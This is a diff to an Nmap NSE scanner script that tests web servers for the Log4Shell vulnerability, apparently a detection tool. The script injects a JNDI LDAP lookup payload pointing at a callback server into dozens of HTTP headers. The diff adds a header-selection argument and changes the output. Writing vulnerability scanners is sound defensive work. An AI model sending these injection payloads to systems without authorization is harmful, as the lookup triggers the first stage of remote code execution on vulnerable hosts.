@@ -50,8 +50,9 @@ categories = {"vuln", "safe", "external"}
 
 ---
 -- @usage
--- nmap --script log4shell [--script-args log4shell.callback-server=127.0.0.1:1389] -p <port> <host>
--- @args log4shell.callback-server JNDIExploit host port
+-- nmap --script log4shell [--script-args log4shell.callback-server=127.0.0.1:1389 log4shell.http-headers="User-Agent,X-API-Version"] -p <port> <host>
+-- @args log4shell.callback-server Callback server
+-- @args log4shell.http-headers    Comma-separated list of HTTP headers
 -- @output
 -- PORT   STATE SERVICE
 -- 80/tcp open  http
@@ -64,15 +65,17 @@ categories = {"vuln", "safe", "external"}
 -- 2021-12-13   Test all headers known
 --              Changed output format
 --              Added log4shell.callback-server arg (instead of log4shell.exploit-server)
+-- 2021-12-14   Added log4shell.http-headers arg
+--              Improved output
 --
 
 local http      = require "http"
-local json      = require "json"
 local string    = require "string"
 local table     = require "table"
 local nmap      = require "nmap"
 local stdnse    = require "stdnse"
 local shortport = require "shortport"
+local stringaux = require "stringaux"
 
 portrule = shortport.http
 
@@ -81,9 +84,17 @@ action = function(host, port)
   local output = {}
 
   local callback_server = stdnse.get_script_args('log4shell.callback-server') or stdnse.get_script_args('log4shell.exploit-server') or '127.0.0.1:1389'
+  local http_headers    = stdnse.get_script_args('log4shell.http-headers') or nil
+
   local exploit_payload = string.format('${jndi:ldap://%s/log4shell/%s/%s}', callback_server, host.ip, port.number)
 
   local payload_headers = {'X-Api-Version', 'User-Agent', 'Cookie', 'Referer', 'Accept-Language', 'Accept-Encoding', 'Upgrade-Insecure-Requests', 'Accept', 'upgrade-insecure-requests', 'Origin', 'Pragma', 'X-Requested-With', 'X-CSRF-Token', 'Dnt', 'Content-Length', 'Access-Control-Request-Method', 'Access-Control-Request-Headers', 'Warning', 'Authorization', 'TE', 'Accept-Charset', 'Accept-Datetime', 'Date', 'Expect', 'Forwarded', 'From', 'Max-Forwards', 'Proxy-Authorization', 'Range,', 'Content-Disposition', 'Content-Encoding', 'X-Amz-Target', 'X-Amz-Date', 'Content-Type', 'Username', 'IP', 'IPaddress', 'Hostname'}
+
+  if http_headers ~= nil then
+    payload_headers = stringaux.strsplit(',', http_headers)
+  end
+
+  local http_headers_used = ''
 
   for i, payload_header in ipairs(payload_headers) do
 
@@ -95,8 +106,6 @@ action = function(host, port)
       }
     }
 
-    stdnse.debug1(exploit_payload)
-
     local response = http.get(host, port.number, '/', option)
     local status   = response.status
     local continue = false
@@ -104,15 +113,18 @@ action = function(host, port)
     if status == nil then
       -- Something went really wrong out there
       -- According to the NSE way we will die silently rather than spam user with error messages
-    elseif status ~= 200 then
-      -- Again just die silently
+    else
+      http_headers_used = string.format('%s\n - %s (%s)', http_headers_used, payload_header, status)
     end
 
-      if status >= 200 then
-        table.insert(output, string.format('(!) Sended payload %s using %s header.\nFor confirmation see %s server log', exploit_payload, payload_header, callback_server))
-      end
-
   end
+
+  table.insert(output, string.format('(!) Sended payload %s using HTTP headers:\n%s\n\nInspect the callback server (%s) or web-application (%s:%s) logs',
+    exploit_payload,
+    http_headers_used,
+    callback_server,
+    host.ip,
+    port.number))
 
   return stdnse.format_output(true, output)
 
